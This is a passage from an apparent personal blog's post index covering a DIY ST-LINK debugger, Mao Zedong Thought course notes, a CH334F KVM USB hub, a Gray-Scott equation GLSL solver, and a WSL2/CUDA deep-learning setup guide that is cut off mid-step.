电阻，可能可以通过在一侧 CC 上并联一个下拉电阻来实现方向检测，未 经验证。 结论 灌水灌不下去了。 参考文献 推荐阅读： Ruan Xingzhi “DIY：自制 DAPLink” Arya Voronova “All About USB-C: Resistors And Emarkers” 附录 ST-LINK 指示灯含义 STM32F103CBT6 旁边的两个 LED 灯的含义如下： 红色闪烁：已上电，未连接到电脑（大概率是 CH334 不支持免晶振） 红色常亮：已连接到电脑，未连接到目标芯片 红绿交替闪烁：正在传输数据 绿色常亮：上次传输数据成功 红绿常亮：上次传输数据失败 Type-C 公口旁边的 LED 灯的含义如下： 不亮：供电正常 亮：供电异常，可能是过流或倒灌 BOM 主要元件淘宝参考价格： STM32F103CBT6：2.2 元包邮 CH334F / CH334P：1.5 元邮费 1 元（注意批次） XC6206P332MR：2 元 20 个包邮 S9013: 2 元 100 个包邮 TPS2553：0.6 元包邮 RS2227XUTQK10: 0.52 元运费 1 元 CH443K：0.12 元运费 1 元 RS8901XF: 0.45 元运费 1 元 16Pin Type-C 贴片母座：2.8 元 10 个包邮 24Pin Type-C 0.8 夹板公头：0.48 元运费 1.5 元 合计单个调试器主要元件成本不到 10 元。按立创 EDA 导出的 BOM, 立创贴片五个板全贴 元件价格约 140 元。 资源 原理图，PCB 和固件均在嘉立创开源广场： https://oshwhub.com/duanyll/stlink-sbuhttps://oshwhub.com/duanyll/stlink-sbu 更多图片","tags":["电子设计","嘉立创eda","stm32"],"categories":["技术"]},{"title":"毛概","path":"/2024/8/27/Mao/","content":"导论 马克思主义中国化的提出 1921 中国共产党成立, 将马克思列宁主义列为指导思想 1931 左倾错误将马克思主义教条化 1938 毛泽东六届六中全会上做《论新阶段》报告，提出马克思主义中国化命题 1945 刘少奇在党的七大上指出毛泽东思想是 “中国化的马克思主义” 2021 党的十九届六中全会阐述马克思主义中国化时代化的重大历史意义 2022 党的二十大把 “不断谱写马克思主义中国化时代化新篇章” 作为当代中国共产党人的历史责任， 并提出继续推进马克思主义中国化时代化的新要求 为什么进行马克思主义中国化时代化 马克思主义必须中国化才能 落地生根， 本土化才能 深入人心 中国化包含着时代化的意蕴 中国化时代化是理论本身发展的 内在要求 中国化时代化是解决中国实际问题的 客观需要 中国化时代化的内涵 立足中国国情和时代特点 坚持把马克思主义基本原理同中国具体实际相结合 同中华优秀传统文化相结合 三层意思 运用立场、观点、方法，观察、把握、引领时代，解决中国革命、建设、改革的 实际问题 总结提炼中国实践经验并上升为理论，丰富发展马克思主义理论宝库，赋予新的时代内涵 运用中国人民喜闻乐见的民族语言来阐述马克思主义，使其根植于中华优秀传统文化的土壤之中 坚持和发展马克思主义，必须同中国具体实际相结合，同中华优秀传统文化相结合 马克思主义中国化时代化理论成果 成果 毛泽东思想 邓小平理论 “三个代表” 重要思想 科学发展观 习近平新时代中国特色社会主义思想 关系：一脉相承、与时俱进 中国特色社会主义理论体系回答的问题 什么是 社会主义，怎样建设社会主义 建设什么样的 党，怎样建设党 实现什么样的 发展，怎样发展 新时代坚持和发展什么样的 中国特色社会主义，怎样坚持和发展…… 建设什么样的 社会主义现代化强国，怎样建设…… 建设什么样的 长期执政的马克思主义政党，怎样建设…… 毛泽东思想的形成和发展 毛泽东思想形成和发展的条件 时代条件：帝国主义和无产阶级革命，马列主义的传播 社会条件：近代中国半殖民半封建，中国革命特殊性 实践基础：中国共产党领导人民进行革命和建设的成果实践 理论基础：马列主义，中国革命和建设的深刻教训 各阶段代表作：提出、初步形成、成熟、确立、继续发展 毛泽东思想的主要内容 新民主主义革命理论 社会主义革命和社会主义建设理论 革命军队建设和军事战略的理论 政策和策略的理论 思想政治工作和文化工作的理论 党的建设理论 毛泽东思想活的灵魂 实事求是 实事求是是毛泽东思想的基本点，是毛泽东思想的精髓 一切从实际出发，理论联系实际，坚持在实践中检验和发展真理 如何做到实事求是 深入了解事物本来面貌，把握事物内在必然联系，按照客观规律办事 清醒认识和正确把握我国基本国情 不断推进实践基础上的理论创新 群众路线 一切为了群众，一切依靠群众，从群众中来，到群众中去，把党的正确主张变为群众的自觉行动 群众路线本质上体现的是马克思主义关于人民群众是历史的创造者这一基本原理 如何坚持群众路线 坚持人民是推动历史发展的根本力量 坚持全心全意为人民服务的根本宗旨 保持党同人民群众的血肉联系 独立自主 独立自主是中华民族的优良传统，是中国共产党、中华人民共和国立党立国的重要原则，是我们党从中国实际出发、依靠党和人民进行革命、建设、改革的必然结论 坚持独立思考，走自己的路，坚定不移地维护民族独立、国家主权，把立足点放在依靠自己力量的基础上，积极争取外援，开展国际经济文化交流，学习外国一切对我们有意的先进事物 如何坚持独立自主 坚持中国的事情必须由中国人民自己作主张、自己来处理 坚持独立自主的外交政策，坚定不移走和平发展道路 毛泽东思想的历史地位 马克思主义中国化时代化的第一个重大理论成果 中国革命和建设的科学指南 中国共产党和中国人民宝贵的精神财富 新民主主义革命理论 新民主主义革命理论的总路线 组成 对象：帝国主义、封建主义、官僚资本主义 动力：无产阶级、农民阶级、城市小资产阶级、民族资产阶级 无产阶级是中国革命最基本的动力 农民阶级是中国革命的主力军 领导力量：无产阶级 性质：资产阶级民主主义革命 目标：建立无产阶级领导的各革命阶级的联合专政 前途：社会主义而不是资本主义 区别新旧民主主义革命的根本标志：革命领导权在无产阶级还是在资产阶级手中 基本纲领： 政治纲领：推翻帝国主义和封建主义的统治，建立一个无产阶级领导的、以工农联盟为基础的、各革命阶级联合专政的新民主主义的共和国 经济纲领：没收封建地主阶级的土地归农民所有（主要内容），没收官僚资产阶级的垄断资本归新民主主义的国家所有，保护民族工商业（极具特色） 文化纲领：新民主主义文化就是无产阶级领导的人民大众的反帝反封建的文化，即民族的、科学的、大众的文化 新民主主义革命的道路：农村包围城市，武装夺取政权 土地革命是基本内容 武装斗争是主要形式、有力保证 农村革命根据地是战略阵地 意义：是党运用马主义分析解决中国革命具体问题的光辉典范，对推进中国化时代化有重要的方法论意义 三大法宝： 统一战线 两个联盟 基础：工人阶级和农民阶级、知识分子及其他劳动者的工农联盟 保障：工人阶级与非劳动人民尤其是民族资产阶级的联盟 实践经验 建立巩固的工农联盟 正确对待资产阶级、尤其是民族资产阶级 采取区别对待的方针 坚持独立自主的原则 武装斗争 坚持党对军队的绝对领导 建设全心全意为人民服务的人民军队 开展革命的政治工作 坚持正确的战略战术原则 党的建设 把思想建设始终放在党的建设首位 在任何时候需要重视党的组织建设 重视党的作风建设 联系党的政治路线加强党的建设 关系： 统一战线和武装斗争是两个基本特点、两个基本武器 党的建设是掌握两个武器冲锋陷阵的英勇战士 意义： 科学回答了当时中国革命何去何从以及发展阶段的问题 开辟了马克思主义中国化的发展道路，丰富了马克思主义理论 对中国革命实践经验的概括和总结，是中国共产党集体智慧的结晶 社会主义改造理论 新民主主义社会（1949-1956）性质：过渡性的社会 党在过渡时期的总路线：一化三改 社会主义工业化 对个体农业、手工业和资本主义工商业的社会主义改造 社会主义改造道路和历史经验 农业的社会主义改造 引导农民组织，走互助合作道路 遵循自愿互利、典型示范和国家帮助的原则，以互助合作的优越性吸引农民走互助合作的道路 正确分析农村的阶级阶层状况，制定正确的阶级政策 积极领导、稳步前进、循序渐进 手工业的社会主义改造 办手工供销小组（社会主义萌芽性质） 办手工业供销合作社（半社会主义性质） 建立手工业生产合作社（社会主义性质） 资本主义工商业的社会主义改造三个方面 和平赎买 低级到高级的国家资本资本主义的过度形式 把资本主义工商业者改造成自食其力的社会主义劳动者 和平赎买的主要目的 和平：避免社会主义改造过程中出现较大的动乱 赎买：使资本家占有的生产资料变成人民的财产，将私营企业变为国营企业，将资本主义私有制变为社会主义公有制。不通过巨额资金，而是让资本家获取企业经营利润 和平赎买的有利性： 有利于发挥私营工商业在国计民生方面的积极作用，促进国民经济发展 有利于争取和团结民族资产阶级，有利于团结各民主党派和各界爱国民主人士，巩固和发展统一战线 有利于发挥民族资产阶级中大多数人的知识、才能、经验，争取和团结原来同资产阶级联系的知识分子为社会主义建设服务 为何能够和平赎买： 民族资产阶级两面性： 剥削工人取得利益 拥护中共领导，拥护宪法，愿意接受社会主义改造 中共同民族资产阶级长期保持统一战线关系，将工人阶级和民族资产阶级之间存在的对抗性矛盾转化为非对抗性矛盾、人民内部矛盾 已有工人阶级领导、工农联盟基础的人民民主专政的国家政权，强大的社会主义国营经济掌握国家经济命脉，造成私人资本主义在政治上经济上依赖社会主义 历史经验 坚持社会主义工业化和社会主义改造并举 积极引导，逐步过渡 和平方法 1956 确立社会主义基本制度的重大意义 国内意义：为当代中国一切发展奠定了制度基础，使广大劳动人民真正成为国家的主人，极大提高了工人阶级和广大劳动人民的积极性、创造性，极大促进了我国社会生产力的发展 国际意义：改变世界政治经济格局，增强了社会主义力量，对维护世界和平产生了积极影响 理论意义：是以毛泽东为代表的中国对中国如何进行社会主义革命问题的系统回答和正确解决，是马列主义社会主义革命理论在中国的正确应用和创造性发展的结果 社会主义建设道路初步探索的理论成果 1956 毛泽东《论十大关系》：调动一切积极因素为社会主义事业服务，前五条主要讨论经济问题 重工业和轻工业、农业 沿海工业和内地工业 经济建设和国防建设 国家、生产单位和生产者个人 中央和地方 汉族和少数民族 党和非党 革命和反革命 是非 中国和外国 党的八大关于社会主要矛盾的表述 社会主义社会的基本矛盾：生产关系和生产力、经济基础和上层建筑 人民根本利益一致基础上的矛盾 非对抗性矛盾 可以经过社会主义制度本身不断解决 主要矛盾： 人民对建立先进的工业国同的要求同落后的农业国的现实的矛盾 人民对经济文化迅速发展的需要同当前经济文化不能满足人民需要的状况的矛盾 根本任务：解放生产力，发展生产力，逐步实现社会主义现代化 两类不同性质矛盾： 敌我矛盾：分清敌我，采用专政的方法（依法治罪，剥夺政治权利） 人民内部矛盾：分清是非，采用民主的方法（讨论、批评、说服教育） 政治思想领域：团结——批评——团结 物质利益分配：统筹兼顾、适当安排 人民群众和政府机关：民主集中制 科学文化：百花齐放、百家争鸣 共产党和民主党派：长期共存、互相监督 民族间矛盾：民族平等、团结互助 走中国工业化道路的思想 三个必须 必须采取正确的经济建设方针 必须调整和完善所有制结构：三个主体，三个补充 工商业经验：国家经营是主体，一定数量的个体经营是补充 生产计划：计划生产是主体，按照市场变化在计划许可范围内的自由生产是补充 统一市场：国家市场是主体，一定范围内国家领导的自由市场是补充 必须探索适合我国情况的经济体制和运行机制：两参一改三结合 初步探索的意义： 巩固发展我国社会主义制度 为开创中国特色社会主义提供宝贵经验、理论准备、物质基础 丰富科学社会主义的理论和实践 中国特色社会主义理论体系的形成和发展 失误的深层次原因 偏离了党的实事求是路线，对国际国内的形势、对我国社会主义发展所处的历史阶段及社会主要矛盾做出了错误判断 对什么是社会主义和如何建设社会主义的问题没有完全搞清楚，因此不可能集中发展生产力，也不可能对社会主义的某些制度和体制进行有效的改革 中国共产党百年奋斗的历史经验 党的领导 人民至上 理论创新 独立自主 中国道路 胸怀天下 开拓创新 敢于斗争 统一战线 自我革命 中国特色社会主义理论：1992 十四大 邓小平理论：1997 十五大 习近平新时代中国特色社会主义思想回答了 新时代坚持和发展什么样的 中国特色社会主义，怎样坚持和发展…… 建设什么样的 社会主义现代化强国，怎样建设…… 建设什么样的 长期执政的马克思主义政党，怎样建设…… 习近平新时代中国特色社会主义思想 是对马……科学发展观的继承和发展 是当代中国马克思主义，21 世纪马克思主义 中国文化和中国精神的时代精华 党和人民实践经验和集体智慧的结晶 中国特色社会主义理论体系的重要组成部分 全党全国人民为实现中华民族伟大复兴的奋斗指南 邓小平理论 首要的理论问题：在中国这个经济文化比较落后的国家建设什么样的社会主义，怎样建设社会主义 成熟的标志：南方讲话，指出 社会主义的本质就是解放生产力，发展生产力，消灭剥削，消灭两极分化，最终达到共同富裕 邓小平理论的精髓：解放思想，实事求是 社会主义初级阶段的科学内涵： 两层含义 我国社会已经是社会主义，必须坚持而不能离开社会主义 我国社会主义社会还处在初级阶段，必须从这个实际出发而不能超越这个阶段 长期性：我国社会主义初始于半殖民地半封建社会，生产力水平远远落后于发达资本主义国家，决定了我们必须经历一个很长的初级阶段，去实现别的国家在资本主义条件下实现的工业化的生产的商品化、社会化和现代化 基本特征 党在社会主义初级阶段的基本路线：领导和团结全国各族人民，以经济建设为中心，坚持四项基本原则，坚持改革开放，自力更生，艰苦创业，为把我国建设成富强、民主、文明、和谐、美丽的社会主义现代化国家而奋斗 四项基本原则 坚持社会主义道路 坚持人民民主专政 坚持中国共产党的领导 坚持马克思列宁主义、毛泽东思想 社会主义根本任务 社会主义的根本任务是发展发展生产力 党和国家的工作重点是经济建设 科学技术是第一生产力 邓小平关于“科学技术是第一生产力”的观点继承发展了马克思主义关于科学技术是生产力的观点 反映了科学技术在当代发展的新形势和我国现代化建设的新要求 为加快我国科技发展、推动经济社会大踏步赶上时代指明了方向 社会主义改革开放和市场经济理论 三个有利于：判断改革各方面是否得失 是否有利于发展社会主义社会的生产力 是否有利于增强社会主义国家的综合国力 是否有利于提高人民生活水平 社会主义市场经济理论： 计划经济和市场经济不是划分社会制度的标志，计划经济不等于社会主义，市场经济也不等于资本主义 计划和市场都是经济手段，对经济活动的调节各有优劣，社会主义实行市场经济是要把两者优势结合起来 市场经济作为资源配置手段本身不具有制度属性，可以和不同的社会制度结合，从而表现出不同的性质 一国两制与祖国统一 历史地位 马克思列宁主义、毛泽东思想的继承和发展 中国特色社会主义理论体系的开篇之作 改革开放和社会主义现代化建设的科学指南 “三个代表” 重要思想 核心观点：中国共产党 始终代表先进生产力的发展要求 始终代表先进文化的前进方向 始终代表中国最广大人民的根本利益 主要内容 发展是党执政兴国的第一要务 改革是动力，发展是目的，稳定是前提 坚持党的基本路线不动摇，关键是坚持以经济建设为中心不动摇 四项基本原则是立国之本，改革开放是强国之路 建设社会主义市场经济体制 全面建设小康社会 建设社会主义政治文明 社会主义现代化全面发展的三大基本目标：政治文明、物质文明、精神文明 最根本的是坚持党的领导、人民当家作主和依法治国的有机统一 实施引进来和走出去相结合的对外开放战略 推进党建设新的伟大工程 历史地位：立党之本，执政之基，力量之源 科学发展观 科学内涵 推动经济社会发展是科学发展观的第一要义 以人为本是科学发展观的核心立场 全面协调可持续是科学发展观的基本要求 统筹兼顾是科学发展观的根本方法 主要内容 社会主义民主政治：社会主义民主政治的本质和核心是人民当家作主 全面提高党的建设科学化水平：保持和发展党的先进性是马克思主义政党自身建设的根本任务和永恒课题 精神实质：解放思想、实事求是、与时俱进、求真务实","tags":["毛概"],"categories":["课程"]},{"title":"CH334F 双上行切换 USB Hub","path":"/2024/8/16/CH334F-KVM-Hub/","content":"简介 本项目是采用 CH334F 和 RS2227 方案的 USB Hub，可连接两台电脑并使用开关切换上行，实现一套键鼠控制两台电脑。 本项目的功能与此前发布的 支持选择两路上行信号的 SL2.1A USB Hub 类似。根据之前 Hub 的使用体验，本次 CH334F 方案做出了以下改进： 双上行切换架构：原先的方案使用两路理想二极管，在使用开关切换设备时不断开 5V 电源，可能导致某些 USB 设备（如红米电脑音响）不能重置状态与新的主机建立连接。这次使用双刀三掷开关，两边的挡位连接到两台电脑，中间的挡位断开电源，通过简单的方式在切换主机时将设备下电，确保重置设备，也省去了理想二极管。（注：此方案不再能使得两台主机同时为 Hub 供电，降低了供电能力，但对于连接键盘鼠标等低功耗外设已经足够了） 主控芯片：由 SL2.1A 改成 CH334F。CH334F 价格不贵，封装更小，支持高性能的MTT模式（4个TT各对应1个端口，并发处理），性能比 SL2.1A 高，且支持 LED 和过流检测。 USB 模拟开关芯片：从 FSUSB42MUX 换成了 RS2227，便宜得多且封装更小。 增加了 CH217K 过流检测。 增加了 CH334F 提供的端口指示灯。 面积更小，增加了 M2 螺丝孔方便安装外壳。 价格 某宝主要元件参考价格： CH334F：1.8 元包邮 RS2227：0.6 元包邮 CH217K：0.5 元运费 2 元 SK-23D07 侧插双刀三掷开关：0.07 元运费 1 元 16Pin Type-C 贴片母座：0.2 元运费 1 元 金属全包 USB 2.0 Type-A 母座（好看）：0.4元运费 1 元 以上主要元件单套约 5 元，其余电阻电容、TVS 管、晶振不计。 注意事项 阻抗匹配按 90R 设计，叠层为 JLC04161H-3313（其实对于 USB2.0 来说，这点阻抗无所谓了） RS2227 焊盘极小，手刷 SMT 钢网易翻车，建议使用锡膏风枪焊接（个人觉得无引线封装比密集的有引脚封装好焊多了，后者连锡了半个小时都清不干净） 可按数据手册调制 R8 电阻大小配置 CH217K 限流 CH334F 数据手册的 LED 灯参考电路从上到下是 4321 顺序（第一次打板画反了） 在没有连接设备时，CH334F 进入休眠状态，所有指示灯都不亮，插入设备时对应指示灯和总控灯自动亮起 立创 EDA 导出的 BOM 是正确的 更多图片 原理图 嘉立创开源广场（原理图、PCB 和 BOM） https://oshwhub.com/duanyll/ch334-kvm-hubhttps://oshwhub.com/duanyll/ch334-kvm-hub","tags":["电子设计","嘉立创eda"],"categories":["技术"]},{"title":"Differential Equations - Gray Scott Equations","path":"/2024/7/1/DE-7/","content":"Introduction to Gray Scott Equations The Gray-Scott equations are a set of partial differential equations used to model reaction-diffusion systems, particularly in chemistry and biology. They describe the interaction between two chemical species, typically referred to as and , that diffuse and react with each other over time and space. The Gray-Scott model is known for producing a variety of complex, spatially structured patterns, such as spots, stripes, and waves. The nature of the patterns depends on the parameters , , , and . The model can exhibit both steady-state and oscillatory behavior. Formulation of Gray-Scott Equations The Gray-Scott model is defined by the following system of PDEs: where: and are the concentrations of the two chemical species. and are the diffusion coefficients of and , respectively. is the feed rate of the reactant . is the rate at which decays. is the Laplacian operator, representing diffusion in space. Interpretation of Terms Diffusion Terms: and represent the spatial diffusion of species and . These terms cause the chemicals to spread out over time. Reaction Terms: and represent the interaction between and . The term in the equation for indicates that is consumed in the reaction to produce , while the term in the equation for indicates that is produced in the reaction. Feed and Decay Terms: represents the addition of species into the system at a constant rate, while represents the decay of species . Derivation of Numerical Solutions We try to keep everything simple. The Gray-Scott equations are discretized in space using a finite difference method, and the resulting system of ODEs is solved using explicit Euler time-stepping. To give the formulation, we use to denote the time step size, and to denote the spatial step sizes. For the time derivative, we approximate it using the forward difference: The Laplacian in 2D cartesian coordinates is approximated using the five-point stencil: is updated in a similar way. New values of and are calculated using the following update rules: denote at the next time step. The update rules are applied to all grid points in the domain. After updating all grid points, we set and repeat the process for the next time step. Here we formally present the algorithm for solving the Gray-Scott equations: Use a rectangular grid to discretize the spatial-temporal domain. Use forward difference to approximate the time derivative, and five-point central difference to approximate the Laplacian to obtain at each grid point. The term form the truncation error of the finite difference method. The same applies to . The equation applies for time steps 。 Drop the truncation error terms and rearrange the equation to obtain the update rule . The initial condition (IC) is set by assigning given values to all at . The periodic boundary condition (BC) is set by copying the values of at the opposite boundary, i.e., and the same for . The boundary condition is applied at each time step . The update rule can be efficiently implemented on fragment shaders, which are widely supported by modern GPUs. We use a straightforward implementation in GLSL to demonstrate the algorithm. 12345678910111213141516171819202122232425262728293031323334#version 330in vec2 uv0;uniform sampler2D texture0;out vec4 fragColor;uniform float c_du;uniform float c_dv;uniform float c_f;uniform float c_k;uniform float dx;uniform float dy;uniform float hx;uniform float hy;uniform float dt;void main() { vec2 center = texture(texture0, uv0).xy; vec2 left = texture(texture0, uv0 + vec2(-dx, 0)).xy; vec2 right = texture(texture0, uv0 + vec2(dx, 0)).xy; vec2 bottom = texture(texture0, uv0 + vec2(0, -dy)).xy; vec2 top = texture(texture0, uv0 + vec2(0, dy)).xy; float lu = (left.x + right.x - 2.0 * center.x) / (hx * hx) + (top.x + bottom.x - 2.0 * center.x) / (hy * hy); float lv = (left.y + right.y - 2.0 * center.y) / (hx * hx) + (top.y + bottom.y - 2.0 * center.y) / (hy * hy); float du = c_du * lu - center.x * center.y * center.y + c_f * (1.0 - center.x); float dv = c_dv * lv + center.x * center.y * center.y - (c_f + c_k) * center.y; vec2 result = center + vec2(du, dv) * dt; fragColor = vec4(result, 0.0, 1.0);} The periodic boundary condition is not explicitly implemented in the shader. Instead, we use the GL_REPEAT texture wrapping mode to handle the boundary condition. Test of Accuracy and Stability Accuracy It is difficult to obtain an analytical solution for the Gray-Scott equations. From the truncation error term, we could expect the method to have a first-order accuracy in time and second-order accuracy in space. Convergence We could empirically show that the method converges under the condition First we test the convergence of the method by increasing the spatial resolution while keeping the time step size constant. We set , , and . We use a fixed time step size and change the spatial resolution. The result indicate that the system fail to start evolving when the spatial resolution is too low. However, when the spatial resolution is too high, the system is numerically unstable and diverges in a few time steps. It is only possible to obtain stable results when the spatial resolution is within a certain range. Note that since different random noise is added to the initial condition, the exact pattern of the solution may vary in each simulation. Simulation result at T=20000 with different spatial resolutions. The solution diverges when N &gt; 291. We also tried to change the time step size while keeping the spatial resolution constant. The result shows that lower time step size leads to consistent results, and the system diverges when the time step size exceeds a certain value. Simulation result at T=20000 and N=256 with different t'. The solution diverges when t' &gt; 1.17 We finally demonstrate that by decreasing the time step size and increasing the spatial resolution simultaneously, the method could be conditionally convergent. Following the condition , we set to in these simulations. The result shows that the method is convergent under this condition. Simulation result when the convergence condition is satified. Stability We test the stability of the method by extending final simulation time while keeping the spatial resolution and time step size constant. The result shows that the system is stable and the solution converges to a steady state. Simulation result at different time steps Simulation Results We wrote a GPU-accelerated simulation program using OpenGL and GLSL. The program solves the Gray-Scott equations on a 2D grid and visualizes the results in real-time. Screenshot of the simulation program https://github.com/Duanyll/gray-scotthttps://github.com/Duanyll/gray-scott The program contains a GUI that allows users to adjust the parameters of the Gray-Scott equations, such as , , , and $k. Users can observe the patterns generated by the model in real-time and explore the dynamics of reaction-diffusion systems. To run the program, simply run python grayscott.py in the terminal. We present the results of the simulation with different parameters. The patterns generated by the Gray-Scott equations are highly sensitive to the parameters. By adjusting these parameters, we can observe a wide range of patterns, including spots, stripes, and waves. The following images show the phase diagram of the Gray-Scott equation and the results obtained at different locations in the domain. We set , , , , and . The phase diagram of the Gray-Scott equation (Pearson 1993) Results obtained at different conditions Conclusion The Gray-Scott equations are a powerful tool for modeling reaction-diffusion systems and generating complex spatial patterns. By discretizing the equations and solving them numerically, we can observe a wide range of patterns, including spots, stripes, and waves. The numerical method we presented is conditionally convergent and stable under certain conditions. By adjusting the parameters of the model, we can explore the rich dynamics of reaction-diffusion systems and gain insights into the underlying mechanisms that give rise to complex patterns in nature.","tags":["微分方程"],"categories":["课程"]},{"title":"基于 WSL2 和 Docker 的深度学习环境指北","path":"/2024/6/30/WSL2-Docker-Deep-Learning/","content":"为什么要使用 WSL2 和 Docker 来管理深度学习环境？本教程的配置方法旨在日常使用的 Windows 机器上建立 CUDA 加速的深度学习环境，以便进行快速的调试与开发代码，而无需忍受连接到远程服务器的延迟。许多的深度学习库不能在 Windows 上开箱即用（尽管许多库只需少量的代码修改即可兼容 Windows 和 MSVC），或者在 Windows 上难以复现行为，所以需要使用 WSL2。作为虚拟机，WSL2 支持绝大多数的 Linux 内核的特性，相较于其他的虚拟化平台，WSL2 能优雅地与 Windows 宿主机共享同一张 CUDA 显卡。我不喜欢使用 Conda，第一是因为 Resolving Environment 太慢了，第二是 conda 的环境隔离程度实际上并不能满足深度学习的需求。Conda 不能隔离 CUDA 运行库，和其他 apt 管理的 C 库，而 Docker 可以，DevContainers 已包含了一套易用的将 Docker 容器用于开发的方案。 根本碰都不要碰 Docker Desktop, Bug 太多了。本教程直接在 WSL2 中安装 Docker，不需要 Docker Desktop。 实际上，得益于 WSL2 的设计，本文所述的 WSL2 部分的方法也适用于典型的 Ubuntu 主机。Windows 部分的教程需要 Windows 11 或 Windows 10 22H2 (19045) 以上的版本。推荐安装 Windows Terminal 来让命令行体验更美好。 安装 Windows Terminal 并取代 conhost Step 1 - 访问互联网 本教程假定必须使用 HTTP 代理才能访问任何互联网上的网站（实际上相当契合中国大陆的情况了），并且这个代理服务器位于 Windows 宿主机的 7890 端口上。 一个典型的 HTTP 代理软件 我们首先让 Windows 上的程序能使用这个代理服务器。通常来说只需要打开 System Proxy 选项，这会修改 Windows 的 IE 代理设置，适用于多数的图形化程序。不建议打开 TUN 模式，这会让情况变得复杂棘手，建议把 TUN 代理留给 “访问内部资产” 的需求，如 EasyConnect 和 WireGuard，而不是 “访问互联网” 的需求。这里 有关于 TUN 代理的更多讨论和高级用法。 仅仅这样设置是不够的。许多从 Linux 世界移植的命令行程序从环境变量读取代理设置，而不是从 Windows 的 IE 代理设置读取。可添加 Windows 环境变量 http_proxy 和 https_proxy，值均为 http://127.0.0.1:7890. 添加 Windows 环境变量 添加完记得重启打开的 Shell，或者直接重启电脑。 如果以上步骤是正确的，你应该能直接在 PowerShell 中直接 curl google.com 之后还要用到 Windows 的主机名，最好顺手改成好看的名字，不要用默认的乱码。 最好把主机名从默认的乱码改成好打的名字 Step 2 - 安装 Visual Studio 和 CUDA 由于 CUDA 的编译器和调试器都依赖于 MSVC，所以我们直接安装一个完整的 Visual Studio 来减少麻烦。 https://visualstudio.microsoft.com/zh-hans/downloads/https://visualstudio.microsoft.com/zh-hans/downloads/ 下载 Visual Studio Community 2022，安装时选择 C++ 工作负载。安装过程略，只需要一直点下一步。 至少选择 C++ 工作负载，别的看喜好选择。 如果想要减少麻烦，就不要修改任何东西的默认安装路径。 如果 C 盘不够大，就换一个足够大的 C 盘。 安装完 Visual Studio 之后，按提示重启电脑。随后下载并安装 CUDA Toolkit。 https://developer.nvidia.com/cuda-downloads?target_os=Windows&amp;target_arch=x86_64&amp;target_version=10&amp;target_type=exe_localhttps://developer.nvidia.com/cuda-downloads?target_os=Windows&amp;target_arch=x86_64&amp;target_version=10&amp;target_type=exe_local 直接安装你看到的最新版本，无论你想用的深度学习库要求使用哪个版本的 CUDA 只需要一直点下一步。会覆盖显卡驱动，所以屏幕会闪几下。 正确完成本节后，应该能在 Windows 上运行 nvidia-smi 命令，显示显卡的状态。 能在 Windows 上运行 nvidia-smi Step 3 - 安装 WSL2 确保是 Windows 11 或 Windows 10 22H2 (19045) 以上的版本。最新版本的 Windows 应当无需额外设置即可使用 wsl 命令，无论是否安装了 WSL。 可以直接运行 WSL 命令 如果找不到 wsl 命令说明需要手动安装 WSL2。参考官方教程： https://learn.microsoft.com/en-us/windows/wsl/install-manualhttps://learn.microsoft.com/en-us/windows/wsl/install-manual 对于有 wsl 命令的用户，直接运行 wsl --install 即可。安装中会多次请求 UAC 权限，确保有 好的网络连接。 按照提示重启电脑 重启电脑后自动继续安装，或者手动运行 wsl 命令。 设置用户名和密码，按照惯例，输入密码时不会回显 默认为安装了 Ubuntu 22.04，这是我们需要的 Step 4 - 在 WSL 中访问互联网 一种方法是让 WSL 使用 Windows 上的代理服务器联网。由于 Hyper-V 的默认网络设置，WSL2 中 Windows 宿主机的 IP 地址会在每次重启时改变（几乎必然改变）。不过在 WSL2 中能解析 Windows 宿主机的主机名，通过主机名访问 Windows 宿主机，在主机名后加 .local： 确保能从 WSL 内 ping 通主机 就可以直接在 .bashrc 中设置代理（通常 WSL 的主机名和 Windows 是相同的），直接运行命令追加 .bashrc 文件： 12echo 'export http_proxy=http://$(hostname).local:7890' &gt;&gt; ~/.bashrcecho 'export https_proxy=http://$(hostname).local:7890' &gt;&gt; ~/.bashrc 重启 shell 或者直接运行 source ~/.bashrc，应该能直接访问互联网。 确保能直接访问互联网 apt 不会使用这个代理。我的经验是使用国内镜像站会比使用代理更快，所以修改 /etc/apt/sources.list 文件，将默认的源替换为国内源。 123sudo sed -i 's/archive.ubuntu.com/mirrors.ustc.edu.cn/g' /etc/apt/sources.listsudo sed -i 's/security.ubuntu.com/mirrors.ustc.edu.cn/g' /etc/apt/sources.listsudo apt update 注意为了使用 Docker 的 apt 源，还需要设置 apt 代理, 或者也可以按下文的方式使用 apt 国内镜像：123echo \"Acquire::http::Proxy \\\"http://$(hostname).local:7890\\\";\" | sudo tee /etc/apt/apt.conf.d/99proxyecho \"Acquire::https::Proxy \\\"http://$(hostname).local:7890\\\";\" | sudo tee -a /etc/apt/apt.conf.d/99proxysudo apt update Step 5 - 在 WSL 中安装 CUDA 无论最后需要用什么版本的 CUDA，都在 WSL 中安装最新版的 CUDA Toolkit。 https://developer.nvidia.com/cuda-downloads?target_os=Linux&amp;target_arch=x86_64&amp;Distribution=WSL-Ubuntu&amp;target_version=2.0&amp;target_type=deb_networkhttps://developer.nvidia.com/cuda-downloads?target_os=Linux&amp;target_arch=x86_64&amp;Distribution=WSL-Ubuntu&amp;target_version=2.0&amp;target_type=deb_network 注意在官网给出的三种安装方式中, 最推荐使用 deb (network) 的方式安装 CUDA Toolkit, 这样符合一般使用 APT 的操作习惯, 在需要升级 CUDA 版本时最为方便, 其他两种方式都非常容易把 APT 搞爆炸. 目前英伟达的国内 CDN 已经正常使用, 使用官网的下载源会自动重定向到 nvidia.cn 域名, 速度很快. 警告：为什么你的显卡驱动在 apt upgrade 之后就挂了？因为你使用了 runfile (local) 的方式安装了 nvidia 驱动，这是 完全不推荐 的做法。runfile 不会 向 APT 注册它添加的内核模块和库文件，当 apt 尝试升级内核或其他依赖库时，就不会自动重新编译和安装这些模块和库文件，导致重启后系统无法正常工作。请务必使用 APT 安装 NVIDIA 驱动。至少也要使用 deb (local) 的方式安装 CUDA Toolkit，这样才能确保 APT 能正确管理 NVIDIA 驱动和 CUDA 相关的库文件。当然，最好的方法是使用 deb (network)。apt upgrade 和高版本的 CUDA Toolkit 和 nvidia 驱动没那么多毛病，升级后出现错误多半因为之前安装的驱动的方法不对。 1234wget https://developer.download.nvidia.com/compute/cuda/repos/wsl-ubuntu/x86_64/cuda-keyring_1.1-1_all.debsudo dpkg -i cuda-keyring_1.1-1_all.debsudo apt-get updatesudo apt-get -y install cuda-toolkit 使用 APT 在线安装 cuda-toolkit 包会自动安装最新版本的 CUDA Toolkit, 并且在未来可以使用 apt upgrade 命令升级到最新版本. 也可以使用 1sudo apt-get -y install cuda-toolkit-12-9 来安装指定版本的 CUDA Toolkit, 例如 cuda-toolkit-12-9。这样安装不会通过 apt 